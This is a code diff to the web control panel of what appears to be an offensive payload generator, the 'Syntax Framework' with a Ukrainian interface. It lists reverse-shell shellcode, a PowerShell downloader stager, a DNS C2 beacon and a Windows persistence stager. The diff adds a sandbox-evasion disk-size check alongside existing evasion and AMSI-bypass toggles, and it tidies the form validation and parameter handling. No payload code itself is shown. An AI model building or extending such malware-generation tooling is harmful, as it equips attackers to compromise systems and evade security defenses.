@@ -142,9 +142,10 @@
 </head>
 <body class="bg-gradient-to-br from-gray-900 to-black text-gray-200 min-h-screen flex items-center justify-center p-4 selection:bg-indigo-500 selection:text-white">
 
-    <div class="bg-gray-800 p-6 sm:p-8 rounded-xl shadow-2xl w-full max-w-4xl border border-gray-700"> <header class="mb-6 text-center">
+    <div class="bg-gray-800 p-6 sm:p-8 rounded-xl shadow-2xl w-full max-w-4xl border border-gray-700">
+        <header class="mb-6 text-center">
             <h1 class="text-3xl sm:text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-purple-500 to-pink-500">Syntax Framework</h1>
-            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v3.2.GUI</p> </header>
+            <p class="text-lg text-gray-400 mt-1">Контрольна Панель v3.3.GUI</p> </header>
 
         <div class="mb-6 border-b border-gray-700 flex overflow-x-auto">
             <button class="tab-button active" data-tab="payloadGeneratorTab">Генератор Пейлоадів</button>
@@ -167,7 +168,8 @@
                         <option value="reverse_shell_tcp_shellcode_linux_x64">Reverse Shell TCP (Linux x64)</option>
                         <option value="powershell_downloader_stager">PowerShell Downloader Stager</option>
                         <option value="dns_beacon_c2_concept">DNS C2 Маячок (Концепт)</option>
-                        <option value="windows_simple_persistence_stager">Windows Simple Persistence Stager</option> </select>
+                        <option value="windows_simple_persistence_stager">Windows Simple Persistence Stager</option>
+                    </select>
                     <div id="error-payloadArchetype" class="error-message"></div>
                 </div>
 
@@ -294,11 +296,14 @@
                             </label>
                             <label class="checkbox-label text-gray-300">
                                 <input type="checkbox" id="enableEvasionChecks" name="enable_evasion_checks" checked class="form-checkbox">
-                                Увімкнути Перевірки Ухилення
+                                Увімкнути Перевірки Ухилення (загальні)
                             </label>
                             <label class="checkbox-label text-gray-300">
                                 <input type="checkbox" id="enableAmsiBypassConcept" name="enable_amsi_bypass_concept" checked class="form-checkbox">
                                 Увімкнути Концептуальний Обхід AMSI
+                            </label>
+                            <label class="checkbox-label text-gray-300"> <input type="checkbox" id="enableDiskSizeCheck" name="enable_disk_size_check" checked class="form-checkbox">
+                                Увімкнути Перевірку Розміру Диска
                             </label>
                         </div>
                     </div>
@@ -528,13 +533,12 @@
         "reverse_shell_tcp_shellcode_linux_x64": { sectionId: 'params_reverse_shell_tcp', fields: ['c2_target_host_shell', 'c2_target_port_shell', 'shellcodeHexPlaceholder'] },
         "powershell_downloader_stager": { sectionId: 'params_powershell_downloader_stager', fields: ['powershellScriptUrl', 'powershellExecutionArgs'] },
         "dns_beacon_c2_concept": { sectionId: 'params_dns_beacon_c2_concept', fields: ['c2DnsZone', 'dnsBeaconSubdomainPrefix'] },
-        "windows_simple_persistence_stager": { sectionId: 'params_windows_simple_persistence_stager', fields: ['persistenceMethod', 'commandToPersist', 'artifactName'] } // New archetype config
+        "windows_simple_persistence_stager": { sectionId: 'params_windows_simple_persistence_stager', fields: ['persistenceMethod', 'commandToPersist', 'artifactName'] }
     };
 
     const payloadValidationRules = {
         "payload_archetype": { required: true },
         "message_to_echo": { requiredIf: "demo_echo_payload", minLength: 1 },
-        "directory_to_list": { /* no specific validation, defaults to . */ },
         "c2_beacon_endpoint": { requiredIf: "demo_c2_beacon_payload", isUrl: true },
         "c2_target_host_shell": {
              requiredIf: ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"],
@@ -551,11 +555,10 @@
         "powershell_script_url": { requiredIf: "powershell_downloader_stager", isUrl: true },
         "c2_dns_zone": { requiredIf: "dns_beacon_c2_concept", isDomain: true },
         "dns_beacon_subdomain_prefix": { requiredIf: "dns_beacon_c2_concept", isSubdomain: true },
-        "persistence_method": { requiredIf: "windows_simple_persistence_stager" }, // New validation
-        "command_to_persist": { requiredIf: "windows_simple_persistence_stager", minLength: 1 }, // New validation
-        "artifact_name": { requiredIf: "windows_simple_persistence_stager", minLength: 3, isArtifactName: true }, // New validation
-        "obfuscation_key": { required: true, minLength: 5 },
-        "pyinstaller_options": { /* no specific validation, optional */ }
+        "persistence_method": { requiredIf: "windows_simple_persistence_stager" },
+        "command_to_persist": { requiredIf: "windows_simple_persistence_stager", minLength: 1 },
+        "artifact_name": { requiredIf: "windows_simple_persistence_stager", minLength: 3, isArtifactName: true },
+        "obfuscation_key": { required: true, minLength: 5 }
     };
 
 
@@ -597,13 +600,19 @@
         for (const fieldName in payloadValidationRules) {
             const rules = payloadValidationRules[fieldName];
             const formFieldName = payloadForm.elements[fieldName] ? fieldName : (
-                fieldName === 'c2_target_host' ? 'c2_target_host_shell' :
+                fieldName === 'c2_target_host' ? 'c2_target_host_shell' : // Map generic to specific
                 fieldName === 'c2_target_port' ? 'c2_target_port_shell' : fieldName
             );
             const inputElement = payloadForm.elements[formFieldName];
             const value = inputElement ? (inputElement.type === 'checkbox' ? inputElement.checked : String(formData.get(formFieldName)).trim()) : null;
+
             // Construct error element ID carefully, handling cases where inputElement might not exist for a rule
-            const errorElementIdBase = inputElement ? inputElement.id : formFieldName;
+            // This is important for fields like 'c2_target_host' which uses 'c2TargetHostShell' as ID
+            let errorElementIdBase = fieldName; // Default to rule key
+            if (fieldName === 'c2_target_host') errorElementIdBase = 'c2TargetHostShell';
+            else if (fieldName === 'c2_target_port') errorElementIdBase = 'c2TargetPortShell';
+            else if (inputElement) errorElementIdBase = inputElement.id;
+
             const errorElementId = `error-${errorElementIdBase.replace(/_/g, '')}`;
 
 
@@ -612,16 +621,17 @@
                 isFieldRequired = true;
             } else if (typeof rules.requiredIf === 'string' && rules.requiredIf === currentArchetype) {
                 isFieldRequired = true;
-            } else if (rules.requiredIf) {
+            } else if (rules.requiredIf && typeof rules.requiredIf !== 'boolean') { // If requiredIf is set but doesn't match, it's not required for this archetype
                  isFieldRequired = false;
             }
 
-            if (isFieldRequired && (value === null || value === '' || value === false && inputElement && inputElement.type !== 'checkbox')) {
+
+            if (isFieldRequired && (value === null || value === '' || (value === false && inputElement && inputElement.type !== 'checkbox'))) {
                 displayError(errorElementId, `Параметр є обов'язковим.`);
                 isValid = false; continue;
             }
 
-            if (value !== null && value !== '') {
+            if (value !== null && value !== '') { // Only validate if there's a value (or it's a checkbox that might be false but still needs to be part of payload)
                 if (rules.minLength && String(value).length < rules.minLength) {
                     displayError(errorElementId, `Мін. довжина: ${rules.minLength} символів.`); isValid = false;
                 }
@@ -646,7 +656,7 @@
                 if (rules.isSubdomain && !/^[a-zA-Z0-9][a-zA-Z0-9\-]*$/.test(String(value))) {
                      displayError(errorElementId, `Невірний формат префіксу субдомену.`); isValid = false;
                 }
-                 if (rules.isArtifactName && !/^[a-zA-Z0-9_.-]+$/.test(String(value))) { // Validation for artifact_name
+                 if (rules.isArtifactName && !/^[a-zA-Z0-9_.-]+$/.test(String(value))) {
                     displayError(errorElementId, `Дозволені символи: a-z, A-Z, 0-9, _, ., -`); isValid = false;
                 }
             }
@@ -660,7 +670,7 @@
             event.preventDefault();
             setButtonLoadingState(generatePayloadButton, true, 'Згенерувати Пейлоад');
             const formData = new FormData(payloadForm);
-            const params = {};
+            let params = {}; // Use let for reassignment
 
             if (!validatePayloadFormGUI(formData)) {
                 payloadGenerationLog.textContent = '[VALIDATOR_FAILURE] Будь ласка, виправте помилки у формі.';
@@ -671,17 +681,25 @@
             const archetype = formData.get('payload_archetype');
             params['payload_archetype'] = archetype;
 
+            // Collect common and archetype-specific parameters
             for (const [key, value] of formData.entries()) {
                 if (key === 'payload_archetype') continue;
 
-                if (key === 'enable_stager_metamorphism' || key === 'enable_evasion_checks' || key === 'enable_amsi_bypass_concept') {
+                if (key === 'enable_stager_metamorphism' || key === 'enable_evasion_checks' || key === 'enable_amsi_bypass_concept' || key === 'enable_disk_size_check') {
                     params[key] = document.getElementById(key).checked;
-                } else if (key === 'c2_target_port_shell') {
+                } else if (key === 'c2_target_port_shell' && (archetype === "reverse_shell_tcp_shellcode_windows_x64" || archetype === "reverse_shell_tcp_shellcode_linux_x64")) {
                     params['c2_target_port'] = value ? parseInt(value, 10) : null;
-                } else if (key === 'c2_target_host_shell') {
+                } else if (key === 'c2_target_host_shell' && (archetype === "reverse_shell_tcp_shellcode_windows_x64" || archetype === "reverse_shell_tcp_shellcode_linux_x64")) {
                      params['c2_target_host'] = value;
                 }
-                else { params[key] = value; }
+                // For other fields, use their direct name if they are part of the current archetype's config
+                else if (payloadParamSectionsConfig[archetype] && payloadParamSectionsConfig[archetype].fields.includes(key)) {
+                     params[key] = value;
+                } else if (!payloadParamSectionsConfig[archetype] && payloadForm.elements[key]) { // General fields not tied to a specific archetype section
+                     params[key] = value;
+                } else if (key === 'obfuscation_key' || key === 'output_format' || key === 'pyinstaller_options'){ // Always include these general fields
+                    params[key] = value;
+                }
             }
 
 
